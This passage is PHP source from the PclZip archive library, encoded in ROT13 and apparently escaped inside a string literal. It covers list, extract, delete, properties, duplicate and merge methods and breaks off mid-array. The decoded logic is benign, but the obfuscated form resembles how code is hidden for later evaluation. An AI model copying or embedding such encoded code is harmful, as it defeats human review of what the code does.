  //   Gur cebcregvrf bs rnpu ragevrf va gur yvfg ner (hfrq nyfb va bgure shapgvbaf) :
  //     svyranzr : Anzr bs gur svyr. Sbe n perngr be nqq npgvba vg vf gur svyranzr
  //                tvira ol gur hfre. Sbe na rkgenpg shapgvba vg vf gur svyranzr
  //                bs gur rkgenpgrq svyr.
  //     fgberq_svyranzr : Anzr bs gur svyr / qverpgbel fgberq va gur nepuvir.
  //     fvmr : Fvmr bs gur fgberq svyr.
  //     pbzcerffrq_fvmr : Fvmr bs gur svyr'f qngn pbzcerffrq va gur nepuvir
  //                       (jvgubhg gur urnqref bireurnq)
  //     zgvzr : Ynfg xabja zbqvsvpngvba qngr bs gur svyr (HAVK gvzrfgnzc)
  //     pbzzrag : Pbzzrag nffbpvngrq jvgu gur svyr
  //     sbyqre : gehr | snyfr
  //     vaqrk : vaqrk bs gur svyr va gur nepuvir
  //     fgnghf : fgnghf bs gur npgvba (qrcraqvat bs gur npgvba) :
  //              Inyhrf ner :
  //                bx : BX !
  //                svygrerq : gur svyr / qve vf abg rkgenpgrq (svygrerq ol hfre)
  //                nyernql_n_qverpgbel : gur svyr pna abg or rkgenpgrq orpnhfr n
  //                                      qverpgbel jvgu gur fnzr anzr nyernql rkvfgf
  //                jevgr_cebgrpgrq : gur svyr pna abg or rkgenpgrq orpnhfr n svyr
  //                                  jvgu gur fnzr anzr nyernql rkvfgf naq vf
  //                                  jevgr cebgrpgrq
  //                arjre_rkvfg : gur svyr jnf abg rkgenpgrq orpnhfr n arjre svyr rkvfgf
  //                cngu_perngvba_snvy : gur svyr vf abg rkgenpgrq orpnhfr gur sbyqre
  //                                     qbrf abg rkvfg naq pna abg or perngrq
  //                jevgr_reebe : gur svyr jnf abg rkgenpgrq orpnhfr gurer jnf na
  //                              reebe juvyr jevgvat gur svyr
  //                ernq_reebe : gur svyr jnf abg rkgenpgrq orpnhfr gurer jnf na reebe
  //                             juvyr ernqvat gur svyr
  //                vainyvq_urnqre : gur svyr jnf abg rkgenpgrq orpnhfr bs na nepuvir
  //                                 sbezng reebe (onq svyr urnqre)
  //   Abgr gung rnpu gvzr n zrgubq pna pbagvahr bcrengvat jura gurer
  //   vf na npgvba reebe ba n svyr, gur reebe vf bayl ybttrq va gur svyr fgnghf.
  // Erghea Inyhrf :
  //   0 ba na haerpbirenoyr snvyher,
  //   Gur yvfg bs gur svyrf va gur nepuvir.
  // --------------------------------------------------------------------------------
  shapgvba yvfgPbagrag()
  {
    $i_erfhyg=1;

    // ----- Erfrg gur reebe unaqyre
    $guvf->ceviReebeErfrg();

    // ----- Purpx nepuvir
    vs (!$guvf->ceviPurpxSbezng()) {
      erghea(0);
    }

    // ----- Pnyy gur rkgenpgvat spg
    $c_yvfg = neenl();
    vs (($i_erfhyg = $guvf->ceviYvfg($c_yvfg)) != 1)
    {
      hafrg($c_yvfg);
      erghea(0);
    }

    // ----- Erghea
    erghea $c_yvfg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba :
  //   rkgenpg($c_cngu=\"./\", $c_erzbir_cngu=\"\")
  //   rkgenpg([$c_bcgvba, $c_bcgvba_inyhr, ...])
  // Qrfpevcgvba :
  //   Guvf zrgubq fhccbegf gjb flabcfvf. Gur svefg bar vf uvfgbevpny.
  //   Guvf zrgubq rkgenpg nyy gur svyrf / qverpgbevrf sebz gur nepuvir gb gur
  //   sbyqre vaqvpngrq va $c_cngu.
  //   Vs lbh jnag gb vtaber gur 'ebbg' cneg bs cngu bs gur zrzbevmrq svyrf
  //   lbh pna vaqvpngr guvf va gur bcgvbany $c_erzbir_cngu cnenzrgre.
  //   Ol qrsnhyg, vs n arjre svyr jvgu gur fnzr anzr nyernql rkvfgf, gur
  //   svyr vf abg rkgenpgrq.
  //
  //   Vs obgu CPYMVC_BCG_CNGU naq CPYMVC_BCG_NQQ_CNGU bcgvbaf
  //   ner hfrq, gur cngu vaqvpngrq va CPYMVC_BCG_NQQ_CNGU vf nccraq
  //   ng gur raq bs gur cngu inyhr bs CPYMVC_BCG_CNGU.
  // Cnenzrgref :
  //   $c_cngu : Cngu jurer gur svyrf naq qverpgbevrf ner gb or rkgenpgrq
  //   $c_erzbir_cngu : Svefg cneg ('ebbg' cneg) bs gur zrzbevmrq cngu
  //                    (vs nal fvzvyne) gb erzbir juvyr rkgenpgvat.
  // Bcgvbaf :
  //   CPYMVC_BCG_CNGU :
  //   CPYMVC_BCG_NQQ_CNGU :
  //   CPYMVC_BCG_ERZBIR_CNGU :
  //   CPYMVC_BCG_ERZBIR_NYY_CNGU :
  //   CPYMVC_PO_CER_RKGENPG :
  //   CPYMVC_PO_CBFG_RKGENPG :
  // Erghea Inyhrf :
  //   0 be n artngvir inyhr ba snvyher,
  //   Gur yvfg bs gur rkgenpgrq svyrf, jvgu n fgnghf bs gur npgvba.
  //   (frr CpyMvc::yvfgPbagrag() sbe yvfg ragel sbezng)
  // --------------------------------------------------------------------------------
  shapgvba rkgenpg()
  {
    $i_erfhyg=1;

    // ----- Erfrg gur reebe unaqyre
    $guvf->ceviReebeErfrg();

    // ----- Purpx nepuvir
    vs (!$guvf->ceviPurpxSbezng()) {
      erghea(0);
    }

    // ----- Frg qrsnhyg inyhrf
    $i_bcgvbaf = neenl();
//    $i_cngu = \"./\";
    $i_cngu = '';
    $i_erzbir_cngu = \"\";
    $i_erzbir_nyy_cngu = snyfr;

    // ----- Ybbx sbe inevnoyr bcgvbaf nethzragf
    $i_fvmr = shap_ahz_netf();

    // ----- Qrsnhyg inyhrf sbe bcgvba
    $i_bcgvbaf[CPYMVC_BCG_RKGENPG_NF_FGEVAT] = SNYFR;

    // ----- Ybbx sbe nethzragf
    vs ($i_fvmr > 0) {
      // ----- Trg gur nethzragf
      $i_net_yvfg = shap_trg_netf();

      // ----- Ybbx sbe svefg net
      vs ((vf_vagrtre($i_net_yvfg[0])) && ($i_net_yvfg[0] > 77000)) {

        // ----- Cnefr gur bcgvbaf
        $i_erfhyg = $guvf->ceviCnefrBcgvbaf($i_net_yvfg, $i_fvmr, $i_bcgvbaf,
                                            neenl (CPYMVC_BCG_CNGU => 'bcgvbany',
                                                   CPYMVC_BCG_ERZBIR_CNGU => 'bcgvbany',
                                                   CPYMVC_BCG_ERZBIR_NYY_CNGU => 'bcgvbany',
                                                   CPYMVC_BCG_NQQ_CNGU => 'bcgvbany',
                                                   CPYMVC_PO_CER_RKGENPG => 'bcgvbany',
                                                   CPYMVC_PO_CBFG_RKGENPG => 'bcgvbany',
                                                   CPYMVC_BCG_FRG_PUZBQ => 'bcgvbany',
                                                   CPYMVC_BCG_OL_ANZR => 'bcgvbany',
                                                   CPYMVC_BCG_OL_RERT => 'bcgvbany',
                                                   CPYMVC_BCG_OL_CERT => 'bcgvbany',
                                                   CPYMVC_BCG_OL_VAQRK => 'bcgvbany',
                                                   CPYMVC_BCG_RKGENPG_NF_FGEVAT => 'bcgvbany',
                                                   CPYMVC_BCG_RKGENPG_VA_BHGCHG => 'bcgvbany',
                                                   CPYMVC_BCG_ERCYNPR_ARJRE => 'bcgvbany'
                                                   ,CPYMVC_BCG_FGBC_BA_REEBE => 'bcgvbany'
                                                   ,CPYMVC_BCG_RKGENPG_QVE_ERFGEVPGVBA => 'bcgvbany',
                                                   CPYMVC_BCG_GRZC_SVYR_GUERFUBYQ => 'bcgvbany',
                                                   CPYMVC_BCG_GRZC_SVYR_BA => 'bcgvbany',
                                                   CPYMVC_BCG_GRZC_SVYR_BSS => 'bcgvbany'
												    ));
        vs ($i_erfhyg != 1) {
          erghea 0;
        }

        // ----- Frg gur nethzragf
        vs (vffrg($i_bcgvbaf[CPYMVC_BCG_CNGU])) {
          $i_cngu = $i_bcgvbaf[CPYMVC_BCG_CNGU];
        }
        vs (vffrg($i_bcgvbaf[CPYMVC_BCG_ERZBIR_CNGU])) {
          $i_erzbir_cngu = $i_bcgvbaf[CPYMVC_BCG_ERZBIR_CNGU];
        }
        vs (vffrg($i_bcgvbaf[CPYMVC_BCG_ERZBIR_NYY_CNGU])) {
          $i_erzbir_nyy_cngu = $i_bcgvbaf[CPYMVC_BCG_ERZBIR_NYY_CNGU];
        }
        vs (vffrg($i_bcgvbaf[CPYMVC_BCG_NQQ_CNGU])) {
          // ----- Purpx sbe '/' va ynfg cngu pune
          vs ((fgeyra($i_cngu) > 0) && (fhofge($i_cngu, -1) != '/')) {
            $i_cngu .= '/';
          }
          $i_cngu .= $i_bcgvbaf[CPYMVC_BCG_NQQ_CNGU];
        }
      }

      // ----- Ybbx sbe 2 netf
      // Urer jr arrq gb fhccbeg gur svefg uvfgbevp flabcfvf bs gur
      // zrgubq.
      ryfr {

        // ----- Trg gur svefg nethzrag
        $i_cngu = $i_net_yvfg[0];

        // ----- Ybbx sbe gur bcgvbany frpbaq nethzrag
        vs ($i_fvmr == 2) {
          $i_erzbir_cngu = $i_net_yvfg[1];
        }
        ryfr vs ($i_fvmr > 2) {
          // ----- Reebe ybt
          CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_CNENZRGRE, \"Vainyvq ahzore / glcr bs nethzragf\");

          // ----- Erghea
          erghea 0;
        }
      }
    }

    // ----- Ybbx sbe qrsnhyg bcgvba inyhrf
    $guvf->ceviBcgvbaQrsnhygGuerfubyq($i_bcgvbaf);

    // ----- Genpr

    // ----- Pnyy gur rkgenpgvat spg
    $c_yvfg = neenl();
    $i_erfhyg = $guvf->ceviRkgenpgOlEhyr($c_yvfg, $i_cngu, $i_erzbir_cngu,
	                                     $i_erzbir_nyy_cngu, $i_bcgvbaf);
    vs ($i_erfhyg < 1) {
      hafrg($c_yvfg);
      erghea(0);
    }

    // ----- Erghea
    erghea $c_yvfg;
  }
  // --------------------------------------------------------------------------------


  // --------------------------------------------------------------------------------
  // Shapgvba :
  //   rkgenpgOlVaqrk($c_vaqrk, $c_cngu=\"./\", $c_erzbir_cngu=\"\")
  //   rkgenpgOlVaqrk($c_vaqrk, [$c_bcgvba, $c_bcgvba_inyhr, ...])
  // Qrfpevcgvba :
  //   Guvf zrgubq fhccbegf gjb flabcfvf. Gur svefg bar vf uvfgbevpny.
  //   Guvf zrgubq vf qbvat n cnegvny rkgenpg bs gur nepuvir.
  //   Gur rkgenpgrq svyrf be sbyqref ner vqragvsvrq ol gurve vaqrk va gur
  //   nepuvir (sebz 0 gb a).
  //   Abgr gung vs gur vaqrk vqragvsl n sbyqre, bayl gur sbyqre ragel vf
  //   rkgenpgrq, abg nyy gur svyrf vapyhqrq va gur nepuvir.
  // Cnenzrgref :
  //   $c_vaqrk : N fvatyr vaqrk (vagrtre) be n fgevat bs vaqrkrf bs svyrf gb
  //              rkgenpg. Gur sbez bs gur fgevat vf \"0,4-6,8-12\" jvgu bayl ahzoref
  //              naq '-' sbe enatr be ',' gb frcnengr enatrf. Ab fcnprf be ';'
  //              ner nyybjrq.
  //   $c_cngu : Cngu jurer gur svyrf naq qverpgbevrf ner gb or rkgenpgrq
  //   $c_erzbir_cngu : Svefg cneg ('ebbg' cneg) bs gur zrzbevmrq cngu
  //                    (vs nal fvzvyne) gb erzbir juvyr rkgenpgvat.
  // Bcgvbaf :
  //   CPYMVC_BCG_CNGU :
  //   CPYMVC_BCG_NQQ_CNGU :
  //   CPYMVC_BCG_ERZBIR_CNGU :
  //   CPYMVC_BCG_ERZBIR_NYY_CNGU :
  //   CPYMVC_BCG_RKGENPG_NF_FGEVAT : Gur svyrf ner rkgenpgrq nf fgevatf naq
  //     abg nf svyrf.
  //     Gur erfhygvat pbagrag vf va n arj svryq 'pbagrag' va gur svyr
  //     fgehpgher.
  //     Guvf bcgvba zhfg or hfrq nybar (nal bgure bcgvbaf ner vtaberq).
  //   CPYMVC_PO_CER_RKGENPG :
  //   CPYMVC_PO_CBFG_RKGENPG :
  // Erghea Inyhrf :
  //   0 ba snvyher,
  //   Gur yvfg bs gur rkgenpgrq svyrf, jvgu n fgnghf bs gur npgvba.
  //   (frr CpyMvc::yvfgPbagrag() sbe yvfg ragel sbezng)
  // --------------------------------------------------------------------------------
  //shapgvba rkgenpgOlVaqrk($c_vaqrk, bcgvbaf...)
  shapgvba rkgenpgOlVaqrk($c_vaqrk)
  {
    $i_erfhyg=1;

    // ----- Erfrg gur reebe unaqyre
    $guvf->ceviReebeErfrg();

    // ----- Purpx nepuvir
    vs (!$guvf->ceviPurpxSbezng()) {
      erghea(0);
    }

    // ----- Frg qrsnhyg inyhrf
    $i_bcgvbaf = neenl();
//    $i_cngu = \"./\";
    $i_cngu = '';
    $i_erzbir_cngu = \"\";
    $i_erzbir_nyy_cngu = snyfr;

    // ----- Ybbx sbe inevnoyr bcgvbaf nethzragf
    $i_fvmr = shap_ahz_netf();

    // ----- Qrsnhyg inyhrf sbe bcgvba
    $i_bcgvbaf[CPYMVC_BCG_RKGENPG_NF_FGEVAT] = SNYFR;

    // ----- Ybbx sbe nethzragf
    vs ($i_fvmr > 1) {
      // ----- Trg gur nethzragf
      $i_net_yvfg = shap_trg_netf();

      // ----- Erzbir sbez gur bcgvbaf yvfg gur svefg nethzrag
      neenl_fuvsg($i_net_yvfg);
      $i_fvmr--;

      // ----- Ybbx sbe svefg net
      vs ((vf_vagrtre($i_net_yvfg[0])) && ($i_net_yvfg[0] > 77000)) {

        // ----- Cnefr gur bcgvbaf
        $i_erfhyg = $guvf->ceviCnefrBcgvbaf($i_net_yvfg, $i_fvmr, $i_bcgvbaf,
                                            neenl (CPYMVC_BCG_CNGU => 'bcgvbany',
                                                   CPYMVC_BCG_ERZBIR_CNGU => 'bcgvbany',
                                                   CPYMVC_BCG_ERZBIR_NYY_CNGU => 'bcgvbany',
                                                   CPYMVC_BCG_RKGENPG_NF_FGEVAT => 'bcgvbany',
                                                   CPYMVC_BCG_NQQ_CNGU => 'bcgvbany',
                                                   CPYMVC_PO_CER_RKGENPG => 'bcgvbany',
                                                   CPYMVC_PO_CBFG_RKGENPG => 'bcgvbany',
                                                   CPYMVC_BCG_FRG_PUZBQ => 'bcgvbany',
                                                   CPYMVC_BCG_ERCYNPR_ARJRE => 'bcgvbany'
                                                   ,CPYMVC_BCG_FGBC_BA_REEBE => 'bcgvbany'
                                                   ,CPYMVC_BCG_RKGENPG_QVE_ERFGEVPGVBA => 'bcgvbany',
                                                   CPYMVC_BCG_GRZC_SVYR_GUERFUBYQ => 'bcgvbany',
                                                   CPYMVC_BCG_GRZC_SVYR_BA => 'bcgvbany',
                                                   CPYMVC_BCG_GRZC_SVYR_BSS => 'bcgvbany'
												   ));
        vs ($i_erfhyg != 1) {
          erghea 0;
        }

        // ----- Frg gur nethzragf
        vs (vffrg($i_bcgvbaf[CPYMVC_BCG_CNGU])) {
          $i_cngu = $i_bcgvbaf[CPYMVC_BCG_CNGU];
        }
        vs (vffrg($i_bcgvbaf[CPYMVC_BCG_ERZBIR_CNGU])) {
          $i_erzbir_cngu = $i_bcgvbaf[CPYMVC_BCG_ERZBIR_CNGU];
        }
        vs (vffrg($i_bcgvbaf[CPYMVC_BCG_ERZBIR_NYY_CNGU])) {
          $i_erzbir_nyy_cngu = $i_bcgvbaf[CPYMVC_BCG_ERZBIR_NYY_CNGU];
        }
        vs (vffrg($i_bcgvbaf[CPYMVC_BCG_NQQ_CNGU])) {
          // ----- Purpx sbe '/' va ynfg cngu pune
          vs ((fgeyra($i_cngu) > 0) && (fhofge($i_cngu, -1) != '/')) {
            $i_cngu .= '/';
          }
          $i_cngu .= $i_bcgvbaf[CPYMVC_BCG_NQQ_CNGU];
        }
        vs (!vffrg($i_bcgvbaf[CPYMVC_BCG_RKGENPG_NF_FGEVAT])) {
          $i_bcgvbaf[CPYMVC_BCG_RKGENPG_NF_FGEVAT] = SNYFR;
        }
        ryfr {
        }
      }

      // ----- Ybbx sbe 2 netf
      // Urer jr arrq gb fhccbeg gur svefg uvfgbevp flabcfvf bs gur
      // zrgubq.
      ryfr {

        // ----- Trg gur svefg nethzrag
        $i_cngu = $i_net_yvfg[0];

        // ----- Ybbx sbe gur bcgvbany frpbaq nethzrag
        vs ($i_fvmr == 2) {
          $i_erzbir_cngu = $i_net_yvfg[1];
        }
        ryfr vs ($i_fvmr > 2) {
          // ----- Reebe ybt
          CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_CNENZRGRE, \"Vainyvq ahzore / glcr bs nethzragf\");

          // ----- Erghea
          erghea 0;
        }
      }
    }

    // ----- Genpr

    // ----- Gevpx
    // Urer V jnag gb erhfr rkgenpgOlEhyr(), fb V arrq gb cnefr gur $c_vaqrk
    // jvgu ceviCnefrBcgvbaf()
    $i_net_gevpx = neenl (CPYMVC_BCG_OL_VAQRK, $c_vaqrk);
    $i_bcgvbaf_gevpx = neenl();
    $i_erfhyg = $guvf->ceviCnefrBcgvbaf($i_net_gevpx, fvmrbs($i_net_gevpx), $i_bcgvbaf_gevpx,
                                        neenl (CPYMVC_BCG_OL_VAQRK => 'bcgvbany' ));
    vs ($i_erfhyg != 1) {
        erghea 0;
    }
    $i_bcgvbaf[CPYMVC_BCG_OL_VAQRK] = $i_bcgvbaf_gevpx[CPYMVC_BCG_OL_VAQRK];

    // ----- Ybbx sbe qrsnhyg bcgvba inyhrf
    $guvf->ceviBcgvbaQrsnhygGuerfubyq($i_bcgvbaf);

    // ----- Pnyy gur rkgenpgvat spg
    vs (($i_erfhyg = $guvf->ceviRkgenpgOlEhyr($c_yvfg, $i_cngu, $i_erzbir_cngu, $i_erzbir_nyy_cngu, $i_bcgvbaf)) < 1) {
        erghea(0);
    }

    // ----- Erghea
    erghea $c_yvfg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba :
  //   qryrgr([$c_bcgvba, $c_bcgvba_inyhr, ...])
  // Qrfpevcgvba :
  //   Guvf zrgubq erzbirf svyrf sebz gur nepuvir.
  //   Vs ab cnenzrgref ner tvira, gura nyy gur nepuvir vf rzcgvrq.
  // Cnenzrgref :
  //   Abar be bcgvbany nethzragf.
  // Bcgvbaf :
  //   CPYMVC_BCG_OL_VAQRK :
  //   CPYMVC_BCG_OL_ANZR :
  //   CPYMVC_BCG_OL_RERT :
  //   CPYMVC_BCG_OL_CERT :
  // Erghea Inyhrf :
  //   0 ba snvyher,
  //   Gur yvfg bs gur svyrf juvpu ner fgvyy cerfrag va gur nepuvir.
  //   (frr CpyMvc::yvfgPbagrag() sbe yvfg ragel sbezng)
  // --------------------------------------------------------------------------------
  shapgvba qryrgr()
  {
    $i_erfhyg=1;

    // ----- Erfrg gur reebe unaqyre
    $guvf->ceviReebeErfrg();

    // ----- Purpx nepuvir
    vs (!$guvf->ceviPurpxSbezng()) {
      erghea(0);
    }

    // ----- Frg qrsnhyg inyhrf
    $i_bcgvbaf = neenl();

    // ----- Ybbx sbe inevnoyr bcgvbaf nethzragf
    $i_fvmr = shap_ahz_netf();

    // ----- Ybbx sbe nethzragf
    vs ($i_fvmr > 0) {
      // ----- Trg gur nethzragf
      $i_net_yvfg = shap_trg_netf();

      // ----- Cnefr gur bcgvbaf
      $i_erfhyg = $guvf->ceviCnefrBcgvbaf($i_net_yvfg, $i_fvmr, $i_bcgvbaf,
                                        neenl (CPYMVC_BCG_OL_ANZR => 'bcgvbany',
                                               CPYMVC_BCG_OL_RERT => 'bcgvbany',
                                               CPYMVC_BCG_OL_CERT => 'bcgvbany',
                                               CPYMVC_BCG_OL_VAQRK => 'bcgvbany' ));
      vs ($i_erfhyg != 1) {
          erghea 0;
      }
    }

    // ----- Zntvp dhbgrf gevpx
    $guvf->ceviQvfnoyrZntvpDhbgrf();

    // ----- Pnyy gur qryrgr spg
    $i_yvfg = neenl();
    vs (($i_erfhyg = $guvf->ceviQryrgrOlEhyr($i_yvfg, $i_bcgvbaf)) != 1) {
      $guvf->ceviFjncOnpxZntvpDhbgrf();
      hafrg($i_yvfg);
      erghea(0);
    }

    // ----- Zntvp dhbgrf gevpx
    $guvf->ceviFjncOnpxZntvpDhbgrf();

    // ----- Erghea
    erghea $i_yvfg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : qryrgrOlVaqrk()
  // Qrfpevcgvba :
  //   ***** Qrcerpngrq *****
  //   qryrgr(CPYMVC_BCG_OL_VAQRK, $c_vaqrk) fubhyq or cersreerq.
  // --------------------------------------------------------------------------------
  shapgvba qryrgrOlVaqrk($c_vaqrk)
  {

    $c_yvfg = $guvf->qryrgr(CPYMVC_BCG_OL_VAQRK, $c_vaqrk);

    // ----- Erghea
    erghea $c_yvfg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : cebcregvrf()
  // Qrfpevcgvba :
  //   Guvf zrgubq tvirf gur cebcregvrf bs gur nepuvir.
  //   Gur cebcregvrf ner :
  //     ao : Ahzore bs svyrf va gur nepuvir
  //     pbzzrag : Pbzzrag nffbpvngrq jvgu gur nepuvir svyr
  //     fgnghf : abg_rkvfg, bx
  // Cnenzrgref :
  //   Abar
  // Erghea Inyhrf :
  //   0 ba snvyher,
  //   Na neenl jvgu gur nepuvir cebcregvrf.
  // --------------------------------------------------------------------------------
  shapgvba cebcregvrf()
  {

    // ----- Erfrg gur reebe unaqyre
    $guvf->ceviReebeErfrg();

    // ----- Zntvp dhbgrf gevpx
    $guvf->ceviQvfnoyrZntvpDhbgrf();

    // ----- Purpx nepuvir
    vs (!$guvf->ceviPurpxSbezng()) {
      $guvf->ceviFjncOnpxZntvpDhbgrf();
      erghea(0);
    }

    // ----- Qrsnhyg cebcregvrf
    $i_cebc = neenl();
    $i_cebc['pbzzrag'] = '';
    $i_cebc['ao'] = 0;
    $i_cebc['fgnghf'] = 'abg_rkvfg';

    // ----- Ybbx vs svyr rkvfgf
    vs (@vf_svyr($guvf->mvcanzr))
    {
      // ----- Bcra gur mvc svyr
      vs (($guvf->mvc_sq = @sbcra($guvf->mvcanzr, 'eo')) == 0)
      {
        $guvf->ceviFjncOnpxZntvpDhbgrf();

        // ----- Reebe ybt
        CpyMvc::ceviReebeYbt(CPYMVC_REE_ERNQ_BCRA_SNVY, 'Hanoyr gb bcra nepuvir \''.$guvf->mvcanzr.'\' va ovanel ernq zbqr');

        // ----- Erghea
        erghea 0;
      }

      // ----- Ernq gur prageny qverpgbel vasbezngvba
      $i_prageny_qve = neenl();
      vs (($i_erfhyg = $guvf->ceviErnqRaqPragenyQve($i_prageny_qve)) != 1)
      {
        $guvf->ceviFjncOnpxZntvpDhbgrf();
        erghea 0;
      }

      // ----- Pybfr gur mvc svyr
      $guvf->ceviPybfrSq();

      // ----- Frg gur hfre nggevohgrf
      $i_cebc['pbzzrag'] = $i_prageny_qve['pbzzrag'];
      $i_cebc['ao'] = $i_prageny_qve['ragevrf'];
      $i_cebc['fgnghf'] = 'bx';
    }

    // ----- Zntvp dhbgrf gevpx
    $guvf->ceviFjncOnpxZntvpDhbgrf();

    // ----- Erghea
    erghea $i_cebc;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : qhcyvpngr()
  // Qrfpevcgvba :
  //   Guvf zrgubq perngrf na nepuvir ol pbclvat gur pbagrag bs na bgure bar. Vs
  //   gur nepuvir nyernql rkvfg, vg vf ercynprq ol gur arj bar jvgubhg nal jneavat.
  // Cnenzrgref :
  //   $c_nepuvir : Gur svyranzr bs n inyvq nepuvir, be
  //                n inyvq CpyMvc bowrpg.
  // Erghea Inyhrf :
  //   1 ba fhpprff.
  //   0 be n artngvir inyhr ba reebe (reebe pbqr).
  // --------------------------------------------------------------------------------
  shapgvba qhcyvpngr($c_nepuvir)
  {
    $i_erfhyg = 1;

    // ----- Erfrg gur reebe unaqyre
    $guvf->ceviReebeErfrg();

    // ----- Ybbx vs gur $c_nepuvir vf na vafgnagvngrq CpyMvc bowrpg
    vs ($c_nepuvir vafgnaprbs cpymvc)
    {

      // ----- Qhcyvpngr gur nepuvir
      $i_erfhyg = $guvf->ceviQhcyvpngr($c_nepuvir->mvcanzr);
    }

    // ----- Ybbx vs gur $c_nepuvir vf n fgevat (fb n svyranzr)
    ryfr vs (vf_fgevat($c_nepuvir))
    {

      // ----- Purpx gung $c_nepuvir vf n inyvq mvc svyr
      // GOP : Fubhyq nyfb purpx gur nepuvir sbezng
      vs (!vf_svyr($c_nepuvir)) {
        // ----- Reebe ybt
        CpyMvc::ceviReebeYbt(CPYMVC_REE_ZVFFVAT_SVYR, \"Ab svyr jvgu svyranzr '\".$c_nepuvir.\"'\");
        $i_erfhyg = CPYMVC_REE_ZVFFVAT_SVYR;
      }
      ryfr {
        // ----- Qhcyvpngr gur nepuvir
        $i_erfhyg = $guvf->ceviQhcyvpngr($c_nepuvir);
      }
    }

    // ----- Vainyvq inevnoyr
    ryfr
    {
      // ----- Reebe ybt
      CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_CNENZRGRE, \"Vainyvq inevnoyr glcr c_nepuvir_gb_nqq\");
      $i_erfhyg = CPYMVC_REE_VAINYVQ_CNENZRGRE;
    }

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : zretr()
  // Qrfpevcgvba :
  //   Guvf zrgubq zretr gur $c_nepuvir_gb_nqq nepuvir ng gur raq bs gur pheerag
  //   bar ($guvf).
  //   Vs gur nepuvir ($guvf) qbrf abg rkvfg, gur zretr orpbzrf n qhcyvpngr.
  //   Vs gur $c_nepuvir_gb_nqq nepuvir qbrf abg rkvfg, gur zretr vf n fhpprff.
  // Cnenzrgref :
  //   $c_nepuvir_gb_nqq : Vg pna or qverpgyl gur svyranzr bs n inyvq mvc nepuvir,
  //                       be n CpyMvc bowrpg nepuvir.
  // Erghea Inyhrf :
  //   1 ba fhpprff,
  //   0 be artngvir inyhrf ba reebe (frr orybj).
  // --------------------------------------------------------------------------------
  shapgvba zretr($c_nepuvir_gb_nqq)
  {
    $i_erfhyg = 1;

    // ----- Erfrg gur reebe unaqyre
    $guvf->ceviReebeErfrg();

    // ----- Purpx nepuvir
    vs (!$guvf->ceviPurpxSbezng()) {
      erghea(0);
    }

    // ----- Ybbx vs gur $c_nepuvir_gb_nqq vf na vafgnagvngrq CpyMvc bowrpg
    vs ($c_nepuvir_gb_nqq vafgnaprbs cpymvc)
    {

      // ----- Zretr gur nepuvir
      $i_erfhyg = $guvf->ceviZretr($c_nepuvir_gb_nqq);
    }

    // ----- Ybbx vs gur $c_nepuvir_gb_nqq vf n fgevat (fb n svyranzr)
    ryfr vs (vf_fgevat($c_nepuvir_gb_nqq))
    {

      // ----- Perngr n grzcbenel nepuvir
      $i_bowrpg_nepuvir = arj CpyMvc($c_nepuvir_gb_nqq);

      // ----- Zretr gur nepuvir
      $i_erfhyg = $guvf->ceviZretr($i_bowrpg_nepuvir);
    }

    // ----- Vainyvq inevnoyr
    ryfr
    {
      // ----- Reebe ybt
      CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_CNENZRGRE, \"Vainyvq inevnoyr glcr c_nepuvir_gb_nqq\");
      $i_erfhyg = CPYMVC_REE_VAINYVQ_CNENZRGRE;
    }

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------



  // --------------------------------------------------------------------------------
  // Shapgvba : reebePbqr()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // --------------------------------------------------------------------------------
  shapgvba reebePbqr()
  {
    vs (CPYMVC_REEBE_RKGREANY == 1) {
      erghea(CpyReebePbqr());
    }
    ryfr {
      erghea($guvf->reebe_pbqr);
    }
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : reebeAnzr()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // --------------------------------------------------------------------------------
  shapgvba reebeAnzr($c_jvgu_pbqr=snyfr)
  {
    $i_anzr = neenl ( CPYMVC_REE_AB_REEBE => 'CPYMVC_REE_AB_REEBE',
                      CPYMVC_REE_JEVGR_BCRA_SNVY => 'CPYMVC_REE_JEVGR_BCRA_SNVY',
                      CPYMVC_REE_ERNQ_BCRA_SNVY => 'CPYMVC_REE_ERNQ_BCRA_SNVY',
                      CPYMVC_REE_VAINYVQ_CNENZRGRE => 'CPYMVC_REE_VAINYVQ_CNENZRGRE',
                      CPYMVC_REE_ZVFFVAT_SVYR => 'CPYMVC_REE_ZVFFVAT_SVYR',
                      CPYMVC_REE_SVYRANZR_GBB_YBAT => 'CPYMVC_REE_SVYRANZR_GBB_YBAT',
                      CPYMVC_REE_VAINYVQ_MVC => 'CPYMVC_REE_VAINYVQ_MVC',
                      CPYMVC_REE_ONQ_RKGENPGRQ_SVYR => 'CPYMVC_REE_ONQ_RKGENPGRQ_SVYR',
                      CPYMVC_REE_QVE_PERNGR_SNVY => 'CPYMVC_REE_QVE_PERNGR_SNVY',
                      CPYMVC_REE_ONQ_RKGRAFVBA => 'CPYMVC_REE_ONQ_RKGRAFVBA',
                      CPYMVC_REE_ONQ_SBEZNG => 'CPYMVC_REE_ONQ_SBEZNG',
                      CPYMVC_REE_QRYRGR_SVYR_SNVY => 'CPYMVC_REE_QRYRGR_SVYR_SNVY',
                      CPYMVC_REE_ERANZR_SVYR_SNVY => 'CPYMVC_REE_ERANZR_SVYR_SNVY',
                      CPYMVC_REE_ONQ_PURPXFHZ => 'CPYMVC_REE_ONQ_PURPXFHZ',
                      CPYMVC_REE_VAINYVQ_NEPUVIR_MVC => 'CPYMVC_REE_VAINYVQ_NEPUVIR_MVC',
                      CPYMVC_REE_ZVFFVAT_BCGVBA_INYHR => 'CPYMVC_REE_ZVFFVAT_BCGVBA_INYHR',
